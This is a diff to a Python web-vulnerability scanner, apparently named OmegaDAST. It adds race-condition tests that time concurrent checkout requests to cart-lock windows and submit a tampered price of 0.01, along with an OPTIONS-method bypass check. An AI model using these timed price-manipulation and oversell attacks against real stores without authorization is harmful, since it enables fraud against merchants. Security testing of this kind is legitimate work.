-                        # Sleep for the specified delay
-                        time.sleep(delay_offset)
+                        # Record actual start time
+                        actual_start = time.perf_counter()
+                        
+                        # Sleep for the specified delay using high-resolution timer
+                        target_time = actual_start + delay_offset
+                        current_time = actual_start
+                        while current_time < target_time:
+                            remaining = target_time - current_time
+                            if remaining > 0.001:  # Only sleep if more than 1ms remaining
+                                time.sleep(min(remaining, 0.001))
+                            current_time = time.perf_counter()
+                        
+                        # Wait at barrier to ensure synchronized start
+                        barrier.wait()
                         
                         # Send request
-                        start = time.time()
+                        request_start = time.perf_counter()
                         loop = asyncio.new_event_loop()
                         asyncio.set_event_loop(loop)
                         try:
@@ -21044,11 +24428,16 @@ class InjectionEngine:
                                 )
                         finally:
                             loop.close()
-                        end = time.time()
-                        return (end - start, resp, delay_offset)
+                        request_end = time.perf_counter()
+                        
+                        # Calculate actual delay achieved
+                        actual_delay = request_start - actual_start
+                        request_duration = request_end - request_start
+                        
+                        return (request_duration, resp, delay_offset, actual_delay, request_id)
                     except Exception as e:
                         logging.debug(f"Staggered request error: {e}")
-                        return (None, None, delay_offset)
+                        return (None, None, delay_offset, None, request_id)
                 
                 # Execute staggered requests
                 with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
@@ -21059,19 +24448,24 @@ class InjectionEngine:
                         delay + 0.002,              # +2ms  
                         delay + 0.005               # +5ms
                     ]
-                    futures = [executor.submit(staggered_request, delay_var) for delay_var in delay_variations]
+                    futures = [executor.submit(staggered_request, delay_var, i) for i, delay_var in enumerate(delay_variations)]
                     results = [future.result() for future in concurrent.futures.as_completed(futures)]
                 
                 # Update session from responses if session manager provided
                 if session_manager and session_id:
-                    for timing, resp, delay_offset in results:
+                    for timing, resp, delay_offset, actual_delay, request_id in results:
                         if resp:
                             session_manager.update_session_from_response(session_id, resp)
                 
                 # Analyze results for race conditions
                 timings = [r[0] for r in results if r[0] is not None and r[1]]
+                actual_delays = [r[3] for r in results if r[3] is not None]
+                
                 if len(timings) < 2:
                     continue
+                
+                # Log actual delays for debugging
+                logging.debug(f"[RACE CONDITION] Target delay: {delay*1000}ms, Actual delays: {[d*1000 for d in actual_delays]}ms")
                 
                 # Check for timing anomalies that indicate race conditions
                 timing_variance = statistics.variance(timings) if len(timings) > 1 else 0
@@ -21081,7 +24475,7 @@ class InjectionEngine:
                 if timing_std < 0.002 and timing_variance < 0.000004:
                     await self._add_vulnerability({
                         "type":"Race Condition (Time-Dilation)","url":url,"parameter":"*",
-                        "evidence":f"Low timing variance at {delay*1000}ms delay: std={timing_std:.6f}s, variance={timing_variance:.9f}s² - potential race condition",
+                        "evidence":f"Low timing variance at {delay*1000}ms delay: std={timing_std:.6f}s, variance={timing_variance:.9f}s² - potential race condition. Actual delays: {[f'{d*1000:.2f}ms' for d in actual_delays]}",
                         "severity":"High",
                         "confidence":80,
                         "cwe":CWE_MAP["RaceCondition"],
@@ -21090,10 +24484,11 @@ class InjectionEngine:
                             "timing_anomalies": 1,
                             "consistency_score": 0.9,
                             "race_window_size": num_requests,
-                            "dilation_delay_ms": delay * 1000
+                            "dilation_delay_ms": delay * 1000,
+                            "actual_delays_ms": [d * 1000 for d in actual_delays]
                         }
                     })
-                    logging.warning(f"Race condition detected at {delay*1000}ms delay - std={timing_std:.6f}s")
+                    logging.warning(f"Race condition detected at {delay*1000}ms delay - std={timing_std:.6f}s, actual delays: {[f'{d*1000:.2f}ms' for d in actual_delays]}")
                 
                 # Check for response content differences that might indicate race conditions
                 responses = [r[1] for r in results if r[1] is not None]
@@ -21121,11 +24516,428 @@ class InjectionEngine:
                     except Exception as e:
                         logging.debug(f"Response comparison error: {e}")
             
-            total_time = time.time() - start_time
+            total_time = time.perf_counter() - start_time
             logging.info(f"[RACE CONDITION TIME-DILATION] Completed staggered burst testing in {total_time:.2f}s")
             
         except Exception as e:
             logging.warning(f"Race condition time-dilation test error: {e}")
+
+    async def _detect_cart_lock_state(self, cart_url, session_manager: SessionStateManager = None, session_id: str = None):
+        """
+        Detect if a cart is locked for checkout by monitoring cart state changes.
+        Returns timing information about when locks occur and their duration.
+        """
+        try:
+            logging.info(f"[CART LOCK DETECTION] Monitoring cart lock state at {cart_url}")
+            
+            # Auto-detect parameter names from cart forms
+            detected_params = await self._detect_cart_form_parameters(cart_url)
+            product_id_param = detected_params.get('product_id', 'product_id')
+            quantity_param = detected_params.get('quantity', 'quantity')
+            
+            # Monitor cart state over time to detect lock patterns
+            lock_patterns = []
+            monitoring_duration = 5.0  # seconds
+            sample_interval = 0.01  # 10ms intervals for high-resolution monitoring
+            
+            session_cookies = session_manager.get_session_cookies(session_id) if session_manager and session_id else {}
+            session_headers = session_manager.get_session_headers(session_id) if session_manager and session_id else {}
+            
+            start_time = time.perf_counter()
+            last_state = None
+            state_changes = []
+            
+            while time.perf_counter() - start_time < monitoring_duration:
+                current_time = time.perf_counter()
+                
+                try:
+                    # Check cart status
+                    resp = await self._async_fetch(cart_url, method='GET', 
+                                                 cookies=session_cookies, headers=session_headers)
+                    
+                    if resp and resp.status == 200:
+                        # Extract cart state from response
+                        current_state = self._extract_cart_state(resp)
+                        
+                        # Detect state changes
+                        if last_state and current_state != last_state:
+                            state_change = {
+                                'timestamp': current_time - start_time,
+                                'from_state': last_state,
+                                'to_state': current_state,
+                                'change_type': self._classify_state_change(last_state, current_state)
+                            }
+                            state_changes.append(state_change)
+                            
+                            # Detect lock events
+                            if state_change['change_type'] == 'lock_acquired':
+                                lock_patterns.append({
+                                    'lock_time': state_change['timestamp'],
+                                    'lock_state': current_state
+                                })
+                            elif state_change['change_type'] == 'lock_released':
+                                if lock_patterns:
+                                    lock_patterns[-1]['release_time'] = state_change['timestamp']
+                                    lock_patterns[-1]['duration'] = state_change['timestamp'] - lock_patterns[-1]['lock_time']
+                        
+                        last_state = current_state
+                
+                except Exception as e:
+                    logging.debug(f"Cart state monitoring error: {e}")
+                
+                # High-resolution sleep
+                elapsed = time.perf_counter() - current_time
+                if elapsed < sample_interval:
+                    await asyncio.sleep(sample_interval - elapsed)
+            
+            # Analyze lock patterns
+            if lock_patterns:
+                avg_lock_duration = statistics.mean([lp.get('duration', 0) for lp in lock_patterns if lp.get('duration')])
+                min_lock_duration = min([lp.get('duration', float('inf')) for lp in lock_patterns if lp.get('duration')])
+                max_lock_duration = max([lp.get('duration', 0) for lp in lock_patterns if lp.get('duration')])
+                
+                logging.info(f"[CART LOCK DETECTION] Found {len(lock_patterns)} lock events")
+                logging.info(f"  Avg lock duration: {avg_lock_duration*1000:.2f}ms")
+                logging.info(f"  Min lock duration: {min_lock_duration*1000:.2f}ms")
+                logging.info(f"  Max lock duration: {max_lock_duration*1000:.2f}ms")
+                
+                return {
+                    'has_locks': True,
+                    'lock_patterns': lock_patterns,
+                    'avg_lock_duration': avg_lock_duration,
+                    'min_lock_duration': min_lock_duration,
+                    'max_lock_duration': max_lock_duration,
+                    'state_changes': state_changes
+                }
+            else:
+                logging.info(f"[CART LOCK DETECTION] No lock patterns detected")
+                return {
+                    'has_locks': False,
+                    'lock_patterns': [],
+                    'state_changes': state_changes
+                }
+        
+        except Exception as e:
+            logging.warning(f"Cart lock detection error: {e}")
+            return {'has_locks': False, 'error': str(e)}
+
+    def _extract_cart_state(self, response):
+        """Extract cart state from response"""
+        try:
+            if hasattr(response, 'text'):
+                text = response.text.lower()
+                
+                # Detect various cart states
+                state = {
+                    'locked': 'locked' in text or 'checkout in progress' in text or 'processing' in text,
+                    'available': 'available' in text or 'add to cart' in text,
+                    'reserved': 'reserved' in text or 'held' in text,
+                    'stock': 0
+                }
+                
+                # Try to extract stock information
+                stock_match = re.search(r'stock[:\s]*(\d+)', text)
+                if stock_match:
+                    state['stock'] = int(stock_match.group(1))
+                
+                # Try to extract cart total/price
+                price_match = re.search(r'(?:total|price|amount)[:\s]*\$?(\d+\.?\d*)', text)
+                if price_match:
+                    state['total'] = float(price_match.group(1))
+                
+                return state
+        
+        except Exception as e:
+            logging.debug(f"Cart state extraction error: {e}")
+        
+        return {'locked': False, 'available': False, 'reserved': False}
+
+    def _classify_state_change(self, from_state, to_state):
+        """Classify the type of state change"""
+        if not from_state.get('locked') and to_state.get('locked'):
+            return 'lock_acquired'
+        elif from_state.get('locked') and not to_state.get('locked'):
+            return 'lock_released'
+        elif not from_state.get('reserved') and to_state.get('reserved'):
+            return 'reservation_acquired'
+        elif from_state.get('reserved') and not to_state.get('reserved'):
+            return 'reservation_released'
+        else:
+            return 'state_change'
+
+    async def _replicate_user_journey_timing(self, cart_url, checkout_url, session_manager: SessionStateManager = None, session_id: str = None):
+        """
+        Replicate the exact user journey timing to identify when carts become locked.
+        This measures the timing from cart operations to checkout lock acquisition.
+        """
+        try:
+            logging.info(f"[USER JOURNEY TIMING] Replicating checkout flow at {checkout_url}")
+            
+            # Auto-detect parameter names
+            detected_params = await self._detect_cart_form_parameters(cart_url)
+            product_id_param = detected_params.get('product_id', 'product_id')
+            quantity_param = detected_params.get('quantity', 'quantity')
+            
+            # Simulate the user journey with timing measurements
+            journey_steps = []
+            
+            # Step 1: Add item to cart
+            step_start = time.perf_counter()
+            session_cookies = session_manager.get_session_cookies(session_id) if session_manager and session_id else {}
+            session_headers = session_manager.get_session_headers(session_id) if session_manager and session_id else {}
+            
+            add_cart_data = {product_id_param: 'prod_123', quantity_param: 1}
+            resp = await self._async_fetch(cart_url, method='POST', data=add_cart_data,
+                                         cookies=session_cookies, headers=session_headers)
+            
+            if session_manager and session_id:
+                session_manager.update_session_from_response(session_id, resp)
+            
+            step_end = time.perf_counter()
+            journey_steps.append({
+                'step': 'add_to_cart',
+                'timestamp': step_end - step_start,
+                'success': resp and resp.status == 200
+            })
+            
+            # Step 2: Begin checkout (this is typically when locks occur)
+            await asyncio.sleep(0.1)  # Small delay to simulate user thinking time
+            
+            step_start = time.perf_counter()
+            session_cookies = session_manager.get_session_cookies(session_id) if session_manager and session_id else {}
+            session_headers = session_manager.get_session_headers(session_id) if session_manager and session_id else {}
+            
+            checkout_init_data = {product_id_param: 'prod_123', quantity_param: 1}
+            resp = await self._async_fetch(checkout_url, method='POST', data=checkout_init_data,
+                                         cookies=session_cookies, headers=session_headers)
+            
+            if session_manager and session_id:
+                session_manager.update_session_from_response(session_id, resp)
+            
+            step_end = time.perf_counter()
+            journey_steps.append({
+                'step': 'initiate_checkout',
+                'timestamp': step_end - step_start,
+                'success': resp and resp.status == 200
+            })
+            
+            # Step 3: Monitor for lock acquisition immediately after checkout initiation
+            lock_monitoring = await self._detect_cart_lock_state(cart_url, session_manager, session_id)
+            
+            journey_steps.append({
+                'step': 'lock_monitoring',
+                'lock_info': lock_monitoring
+            })
+            
+            # Calculate critical timing windows
+            timing_windows = {}
+            if lock_monitoring.get('has_locks'):
+                timing_windows = {
+                    'first_lock_time': lock_monitoring['lock_patterns'][0]['lock_time'] if lock_monitoring['lock_patterns'] else None,
+                    'avg_lock_duration': lock_monitoring.get('avg_lock_duration'),
+                    'min_lock_duration': lock_monitoring.get('min_lock_duration'),
+                    'max_lock_duration': lock_monitoring.get('max_lock_duration')
+                }
+            
+            logging.info(f"[USER JOURNEY TIMING] Journey completed")
+            logging.info(f"  Steps: {[step['step'] for step in journey_steps]}")
+            if timing_windows:
+                logging.info(f"  First lock at: {timing_windows.get('first_lock_time', 0)*1000:.2f}ms")
+                logging.info(f"  Lock duration: {timing_windows.get('avg_lock_duration', 0)*1000:.2f}ms (avg)")
+            
+            return {
+                'journey_steps': journey_steps,
+                'timing_windows': timing_windows,
+                'lock_monitoring': lock_monitoring
+            }
+        
+        except Exception as e:
+            logging.warning(f"User journey timing replication error: {e}")
+            return {'error': str(e)}
+
+    async def _test_race_condition_with_cart_lock_timing(self, cart_url, checkout_url, session_manager: SessionStateManager = None, session_id: str = None):
+        """
+        Test race conditions with precise timing synchronized to cart lock windows.
+        This fires race condition attacks exactly when carts are locked for checkout.
+        """
+        try:
+            logging.info(f"[CART LOCK RACE CONDITION] Testing synchronized race conditions at {checkout_url}")
+            
+            # First, replicate user journey to understand timing
+            journey_analysis = await self._replicate_user_journey_timing(cart_url, checkout_url, session_manager, session_id)
+            
+            if journey_analysis.get('error'):
+                logging.warning(f"Could not analyze user journey: {journey_analysis['error']}")
+                return
+            
+            timing_windows = journey_analysis.get('timing_windows', {})
+            lock_monitoring = journey_analysis.get('lock_monitoring', {})
+            
+            if not lock_monitoring.get('has_locks'):
+                logging.info("[CART LOCK RACE CONDITION] No cart locks detected, using standard timing")
+                # Fall back to standard time-dilation testing
+                await self._test_race_condition_time_dilation(checkout_url, session_manager, session_id)
+                return
+            
+            # Get precise lock timing
+            avg_lock_duration = timing_windows.get('avg_lock_duration', 0.010)  # Default to 10ms
+            first_lock_time = timing_windows.get('first_lock_time', 0.005)  # Default to 5ms
+            
+            logging.info(f"[CART LOCK RACE CONDITION] Using precise lock timing")
+            logging.info(f"  Target lock window: {avg_lock_duration*1000:.2f}ms")
+            logging.info(f"  Lock acquisition time: {first_lock_time*1000:.2f}ms")
+            
+            # Auto-detect parameter names
+            detected_params = await self._detect_cart_form_parameters(cart_url)
+            product_id_param = detected_params.get('product_id', 'product_id')
+            quantity_param = detected_params.get('quantity', 'quantity')
+            
+            # Synchronized race condition test that fires during the lock window
+            import concurrent.futures
+            import threading
+            
+            num_concurrent_requests = 5
+            results = []
+            
+            def synchronized_race_request(request_offset, request_id):
+                """Send request synchronized to the lock window."""
+                try:
+                    # Calculate precise timing to hit the lock window
+                    sleep_time = first_lock_time + request_offset
+                    
+                    # High-precision sleep
+                    start_sleep = time.perf_counter()
+                    target_time = start_sleep + sleep_time
+                    current_time = start_sleep
+                    while current_time < target_time:
+                        remaining = target_time - current_time
+                        if remaining > 0.0001:  # 100μs precision
+                            time.sleep(min(remaining, 0.0001))
+                        current_time = time.perf_counter()
+                    
+                    # Send the race condition request
+                    request_start = time.perf_counter()
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    try:
+                        session_cookies = session_manager.get_session_cookies(session_id) if session_manager and session_id else {}
+                        session_headers = session_manager.get_session_headers(session_id) if session_manager and session_id else {}
+                        
+                        # Test price manipulation during lock window
+                        race_data = {
+                            product_id_param: 'prod_123',
+                            quantity_param: 1,
+                            'price': 0.01  # Tampered price
+                        }
+                        
+                        resp = loop.run_until_complete(
+                            self._async_fetch(checkout_url, method='POST', data=race_data,
+                                           cookies=session_cookies, headers=session_headers)
+                        )
+                    finally:
+                        loop.close()
+                    request_end = time.perf_counter()
+                    
+                    actual_offset = request_start - start_sleep
+                    request_duration = request_end - request_start
+                    
+                    return (request_duration, resp, actual_offset, request_id)
+                except Exception as e:
+                    logging.debug(f"Synchronized race request error: {e}")
+                    return (None, None, None, request_id)
+            
+            # Fire requests at precise offsets to hit the lock window
+            # Target the middle of the lock window with slight variations
+            lock_window_offsets = [
+                avg_lock_duration * 0.25,  # 25% into lock window
+                avg_lock_duration * 0.50,  # 50% into lock window (center)
+                avg_lock_duration * 0.75,  # 75% into lock window
+                avg_lock_duration * 0.90,  # 90% into lock window
+                avg_lock_duration * 0.10,  # 10% into lock window
+            ]
+            
+            # Initialize checkout to create the lock condition
+            session_cookies = session_manager.get_session_cookies(session_id) if session_manager and session_id else {}
+            session_headers = session_manager.get_session_headers(session_id) if session_manager and session_id else {}
+            
+            init_data = {product_id_param: 'prod_123', quantity_param: 1}
+            await self._async_fetch(checkout_url, method='POST', data=init_data,
+                                   cookies=session_cookies, headers=session_headers)
+            
+            # Execute synchronized race requests
+            with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent_requests) as executor:
+                futures = [executor.submit(synchronized_race_request, offset, i) 
+                         for i, offset in enumerate(lock_window_offsets)]
+                results = [future.result() for future in concurrent.futures.as_completed(futures)]
+            
+            # Update session from responses
+            if session_manager and session_id:
+                for duration, resp, offset, req_id in results:
+                    if resp:
+                        session_manager.update_session_from_response(session_id, resp)
+            
+            # Analyze results for successful race conditions
+            successful_races = [r for r in results if r[1] and r[1].status == 200]
+            responses = [r[1] for r in results if r[1] is not None]
+            
+            if len(successful_races) > 1:
+                # Check if any responses indicate successful price manipulation
+                for resp in responses:
+                    if hasattr(resp, 'text'):
+                        text = resp.text.lower()
+                        if 'order confirmed' in text or 'payment processed' in text:
+                            if '0.01' in text or re.search(r'price.*0\.01', text):
+                                await self._add_vulnerability({
+                                    "type": "Cart Lock Race Condition",
+                                    "url": checkout_url,
+                                    "parameter": "*",
+                                    "evidence": f"Price manipulation succeeded during cart lock window ({len(successful_races)} successful requests)",
+                                    "severity": "Critical",
+                                    "confidence": 90,
+                                    "cwe": CWE_MAP["RaceCondition"],
+                                    "race_test_results": {
+                                        "success_rate": len(successful_races)/num_concurrent_requests,
+                                        "lock_window_targeted": avg_lock_duration * 1000,
+                                        "actual_offsets_ms": [r[2]*1000 for r in results if r[2] is not None],
+                                        "synchronized_attacks": True
+                                    }
+                                })
+                                logging.warning(f"[CART LOCK RACE CONDITION] Critical: Price manipulation during lock window successful")
+                                break
+            
+            # Also check for response divergence indicating race condition success
+            if len(responses) >= 2:
+                try:
+                    response_texts = []
+                    for resp in responses:
+                        if hasattr(resp, 'text'):
+                            response_texts.append(resp.text)
+                    
+                    unique_responses = set(response_texts)
+                    if len(unique_responses) > 1:
+                        await self._add_vulnerability({
+                            "type": "Cart Lock Response Divergence",
+                            "url": checkout_url,
+                            "parameter": "*",
+                            "evidence": f"Response divergence during cart lock window - {len(unique_responses)} different responses",
+                            "severity": "High",
+                            "confidence": 85,
+                            "cwe": CWE_MAP["RaceCondition"],
+                            "race_test_results": {
+                                "synchronized_attacks": True,
+                                "lock_window_targeted": avg_lock_duration * 1000
+                            }
+                        })
+                        logging.warning(f"[CART LOCK RACE CONDITION] Response divergence during lock window")
+                
+                except Exception as e:
+                    logging.debug(f"Response comparison error: {e}")
+            
+            logging.info(f"[CART LOCK RACE CONDITION] Completed synchronized testing")
+        
+        except Exception as e:
+            logging.warning(f"Cart lock race condition test error: {e}")
+
     async def test_token_validation_window(self, forgot_password_url, change_email_url, target_email):
         try:
             logging.info(f"[TOKEN VALIDATION] Testing race condition on {forgot_password_url}")
@@ -21294,7 +25106,7 @@ class InjectionEngine:
                 return detected_params
             
             html = resp._body
-            soup = BeautifulSoup(html, 'html.parser')
+            soup = get_cached_soup(html, 'html.parser')
             
             # Look for forms that might be cart/purchase related
             cart_keywords = ['cart', 'checkout', 'purchase', 'order', 'product', 'item', 'buy']
@@ -21369,13 +25181,28 @@ class InjectionEngine:
             else:
                 quantity_param = 'quantity'
             
+            # Try to use cart lock timing-aware testing for purchase endpoints
+            cart_url = purchase_url.replace('/purchase', '/cart').replace('/checkout', '/cart').replace('/buy', '/cart')
+            if cart_url == purchase_url:
+                cart_url = purchase_url.rsplit('/', 1)[0] + '/cart'
+            
+            # Try cart lock timing-aware testing first
+            try:
+                logging.info(f"[INVENTORY OVERSELL] Attempting cart lock timing-aware testing")
+                await self._test_race_condition_with_cart_lock_timing(cart_url, purchase_url, session_manager, session_id)
+                logging.info(f"[INVENTORY OVERSELL] Cart lock timing test completed, proceeding with standard oversell test")
+            except Exception as e:
+                logging.debug(f"Cart lock timing test not applicable, using standard oversell test: {e}")
+            
             logging.info(f"[INVENTORY OVERSELL] Testing double-spend on {purchase_url} with 50 concurrent requests with session {session_id}")
             
             # Step 1: Add to cart - Generate and store cart_id using SessionStateManager
             cart_id = None
             if session_manager and session_id:
+                # Use the actual product_id from function parameter
+                actual_product_id = product_id if product_id else 'prod_123'
                 # Use the new add_to_cart_step method that returns cart_id
-                cart_id = session_manager.add_to_cart_step(session_id, purchase_url, 'prod_123', quantity)
+                cart_id = session_manager.add_to_cart_step(session_id, purchase_url, actual_product_id, quantity)
                 if not cart_id:
                     logging.error(f"[INVENTORY OVERSELL] Failed to generate cart_id for session {session_id}")
                     return
@@ -21383,8 +25210,9 @@ class InjectionEngine:
             
             async def single_purchase(request_id):
                 start_time = time.time()
+                actual_product_id = product_id if product_id else 'prod_123'
                 purchase_data = {
-                    product_id: 'prod_123',
+                    product_id: actual_product_id,
                     quantity_param: quantity,
                     "request_id": request_id
                 }
@@ -21508,12 +25336,13 @@ class InjectionEngine:
             oauth_endpoints.update(await self._discover_oauth_endpoints_js_configs())
         
         # Discover OAuth endpoints from crawled pages
-        for page in self.crawler_engine.crawled_pages:
-            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
-            if not page_data:
-                continue
-            html = page_data.get('html_content', '')
-            soup = BeautifulSoup(html, 'html.parser')
+        for page in self.crawler_engine._get_crawled_pages_iterator():
+            if not page.get('html'):
+                # Load HTML from disk if not already loaded
+                html = self.crawler_engine._get_html_content(page['url'])
+                page['html'] = html if html else ''
+            html = page.get('html', '')
+            soup = get_cached_soup(html, 'html.parser')
             
             # Look for OAuth-related links and forms
             oauth_keywords = ['oauth', 'authorize', 'token', 'authentication', 'sso', 'saml', 'openid', 'connect']
@@ -21544,9 +25373,10 @@ class InjectionEngine:
             await self._test_oauth_redirect_manipulation(oauth_url, session_manager, session_id)
             await self._test_oauth_pkce_flow(oauth_url, session_manager, session_id)
             
-            # Interconnect with race condition tests on OAuth endpoints
-            await self._test_basic_race_condition(oauth_url, session_manager, session_id)
-            await self._test_race_condition_timing(oauth_url, session_manager, session_id)
+            # Interconnect with race condition tests on OAuth endpoints with FSM context
+            fsm_context = self.business_logic_fsm if self.fsm_aware_testing_enabled else None
+            await self._test_basic_race_condition(oauth_url, session_manager, session_id, fsm_context=fsm_context)
+            await self._test_race_condition_timing(oauth_url, session_manager, session_id, fsm_context=fsm_context)
             
             # Clean up session
             session_manager.destroy_session(session_id)
@@ -21561,7 +25391,7 @@ class InjectionEngine:
         
         # Get base URLs from crawled pages
         base_urls = set()
-        for page in self.crawler_engine.crawled_pages:
+        for page in self.crawler_engine._get_crawled_pages_iterator():
             parsed = urlparse(page['url'])
             base = f"{parsed.scheme}://{parsed.netloc}"
             base_urls.add(base)
@@ -21613,7 +25443,7 @@ class InjectionEngine:
         
         # Get base URLs from crawled pages
         base_urls = set()
-        for page in self.crawler_engine.crawled_pages:
+        for page in self.crawler_engine._get_crawled_pages_iterator():
             parsed = urlparse(page['url'])
             base = f"{parsed.scheme}://{parsed.netloc}"
             base_urls.add(base)
@@ -22083,7 +25913,7 @@ class InjectionEngine:
             if not page_data:
                 continue
             html = page_data.get('html_content', '')
-            soup = BeautifulSoup(html, 'html.parser')
+            soup = get_cached_soup(html, 'html.parser')
             
             purchase_keywords = ['cart', 'checkout', 'purchase', 'order', 'payment', 'shipping', 'billing']
             
@@ -22116,9 +25946,10 @@ class InjectionEngine:
             # Interconnect with inventory oversell test
             await self.test_inventory_oversell(purchase_url, None, 1, session_manager, session_id)
             
-            # Interconnect with race condition tests on purchase endpoints
-            await self._test_basic_race_condition(purchase_url, session_manager, session_id)
-            await self._test_parallel_resource_allocation(purchase_url, session_manager, session_id)
+            # Interconnect with race condition tests on purchase endpoints with FSM context
+            fsm_context = self.business_logic_fsm if self.fsm_aware_testing_enabled else None
+            await self._test_basic_race_condition(purchase_url, session_manager, session_id, fsm_context=fsm_context)
+            await self._test_parallel_resource_allocation(purchase_url, session_manager, session_id, fsm_context=fsm_context)
             
             # Clean up session
             session_manager.destroy_session(session_id)
@@ -22132,6 +25963,19 @@ class InjectionEngine:
             product_id_param = detected_params.get('product_id', 'product_id')
             quantity_param = detected_params.get('quantity', 'quantity')
             
+            # Try cart lock timing-aware analysis first
+            cart_url = checkout_url.replace('/checkout', '/cart').replace('/purchase', '/cart')
+            if cart_url == checkout_url:
+                cart_url = checkout_url.rsplit('/', 1)[0] + '/cart'
+            
+            try:
+                lock_analysis = await self._replicate_user_journey_timing(cart_url, checkout_url, session_manager, session_id)
+                if lock_analysis.get('timing_windows') and lock_analysis['timing_windows'].get('avg_lock_duration'):
+                    logging.info(f"[PURCHASE SEQUENCE] Using detected lock timing: {lock_analysis['timing_windows']['avg_lock_duration']*1000:.2f}ms")
+            except Exception as e:
+                logging.debug(f"Lock timing analysis not available: {e}")
+                lock_analysis = None
+            
             # Simulate a multi-step checkout process with race conditions
             cart_data = {
                 product_id_param: 'prod_123',
@@ -22139,11 +25983,11 @@ class InjectionEngine:
             }
             
             # Step 1: Add to cart with session management
-            cart_url = checkout_url.replace('/checkout', '/cart/add')
+            cart_add_url = checkout_url.replace('/checkout', '/cart/add')
             session_cookies = session_manager.get_session_cookies(session_id)
             session_headers = session_manager.get_session_headers(session_id)
             
-            cart_resp = await self._async_fetch(cart_url, method='POST', data=cart_data, 
+            cart_resp = await self._async_fetch(cart_add_url, method='POST', data=cart_data, 
                                                cookies=session_cookies, headers=session_headers)
             
             # Update session from response
@@ -22166,6 +26010,11 @@ class InjectionEngine:
                 'cart_id': cart_id,
                 'shipping_method': 'standard'
             }
+            
+            # Use lock timing if available to synchronize attacks
+            if lock_analysis and lock_analysis.get('timing_windows'):
+                lock_duration = lock_analysis['timing_windows'].get('avg_lock_duration', 0.010)
+                logging.info(f"[PURCHASE SEQUENCE] Synchronizing attacks to {lock_duration*1000:.2f}ms lock window")
             
             async def initiate_checkout_with_race(shipping_method):
                 # Get fresh session data for each concurrent request
@@ -22663,7 +26512,7 @@ class InjectionEngine:
             if not page_data:
                 continue
             html = page_data.get('html_content', '')
-            soup = BeautifulSoup(html, 'html.parser')
+            soup = get_cached_soup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 form_text = form.get_text().lower()
                 if any(w in form_text for w in ['delete','remove','logout','reset','wipe']):
@@ -22671,7 +26520,7 @@ class InjectionEngine:
                 action = urljoin(page['url'], form.get('action',''))
                 page_resp = await self._async_fetch(page['url'])
                 if page_resp:
-                    page_soup = BeautifulSoup(page_resp._body, 'html.parser')
+                    page_soup = get_cached_soup(page_resp._body, 'html.parser')
                     csrf_token = None
                     for inp in page_soup.find_all('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
                         csrf_token = inp.get('value')
@@ -22820,6 +26669,7 @@ class InjectionEngine:
             await self._test_post_method(url)
             await self._test_get_method(url)
             await self._test_delete_method(url)
+            await self._test_head_method(url)
             await self._test_options_method(url)
             self.current_task += 1
             self.update_progress(self.current_task, self.total_tasks)
@@ -22846,7 +26696,7 @@ class InjectionEngine:
                     if result:
                         await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                     # Use persistent callback waiting for OOB detection
-                    callback_result = wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5)
+                    callback_result = await wait_for_oob_callback_async(marker, timeout_seconds=30, check_interval=0.5)
                     if callback_result:
                         await self._add_vulnerability({
                             "type": "PUT OOB Callback",
@@ -23053,6 +26903,29 @@ class InjectionEngine:
                 result = Detector.options_method_tampering(resp, baseline_resp, url)
                 if result:
                     await self._add_vulnerability({**result, "url": url})
+            
+            # Test OPTIONS with query parameters (potential bypass)
+            try:
+                parsed = urlparse(url)
+                if parsed.query:
+                    test_url = url
+                else:
+                    test_url = f"{url}?test=param"
+                
+                resp_qp = await self._async_fetch(test_url, method='OPTIONS')
+                if resp_qp and resp_qp.status != 405:  # If not Method Not Allowed
+                    # Check if query params affect OPTIONS response
+                    if resp_qp.headers.get("Access-Control-Allow-Methods") != resp.headers.get("Access-Control-Allow-Methods"):
+                        await self._add_vulnerability({
+                            "type": "OPTIONS Method Query Parameter Bypass",
+                            "url": url,
+                            "evidence": "OPTIONS method behavior changes with query parameters",
+                            "severity": "Medium",
+                            "confidence": 70
+                        })
+            except Exception as e:
+                logging.debug(f"OPTIONS query parameter test error: {e}")
+                
         except Exception as e:
             logging.warning(f"OPTIONS method test error for {url}: {e}")
     
@@ -23339,7 +27212,7 @@ class InjectionEngine:
                         html = await resp.text()
                         
                         # Parse HTML for forms
-                        soup = BeautifulSoup(html, 'html.parser')
+                        soup = get_cached_soup(html, 'html.parser')
                         forms = soup.find_all('form')
                         
                         for form in forms:
@@ -23354,11 +27227,11 @@ class InjectionEngine:
                                     input_name = input_field.get('name')
                                     if input_name:
                                         injection_points.append({
-                                            'url': form_url,
-                                            'parameter': input_name,
-                                            'method': form_method,
-                                            'type': 'form_input'
-                                        })
+                'url': form_url,
+                'parameter': input_name,
+                'method': form_method,
+                'type': 'form_input'
+            })
                                 
                 except Exception as e:
                     logging.debug(f"Failed to analyze {url} for forms: {e}")
@@ -24369,7 +28242,8 @@ class OmegaDAST:
         # Integrate safety controls from global config
         self.config['maturity_level'] = self.config.get('maturity_level', SAFETY_CONFIG.get('maturity_level', 3))
         self.config['dry_run'] = self.config.get('dry_run', SAFETY_CONFIG.get('dry_run', False))
-        print(f"Safety config integrated - Maturity Level: {self.config['maturity_level']}, Dry Run: {self.config['dry_run']}")
+        self.config['auto_resume'] = self.config.get('auto_resume', SAFETY_CONFIG.get('auto_resume', False))
+        print(f"Safety config integrated - Maturity Level: {self.config['maturity_level']}, Dry Run: {self.config['dry_run']}, Auto Resume: {self.config['auto_resume']}")
         
         print("Creating CircuitBreaker...")
         self.circuit_breaker = CircuitBreaker(
@@ -24406,7 +28280,7 @@ class OmegaDAST:
         self.memory_efficient = config.get('memory_efficient', True)
         self.vulnerability_timestamps = {}
         try:
-            self.fp_db = FP_Database()
+            self.fp_db = FP_Database(config=config)
             print("FP_Database initialized successfully in OmegaDAST")
         except Exception as e:
             print(f"Error initializing FP_Database in OmegaDAST: {e}")
@@ -24422,15 +28296,16 @@ class OmegaDAST:
         self.dns_oob_results = []
         self.https_oob_results = []
         self.icmp_oob_results = []
+        # Single unified lock for all OOB operations to prevent deadlock
+        self.oob_unified_lock = threading.Lock()
         self.oob_results_lock = threading.Lock()
         self.smtp_oob_lock = threading.Lock()
         self.dns_oob_lock = threading.Lock()
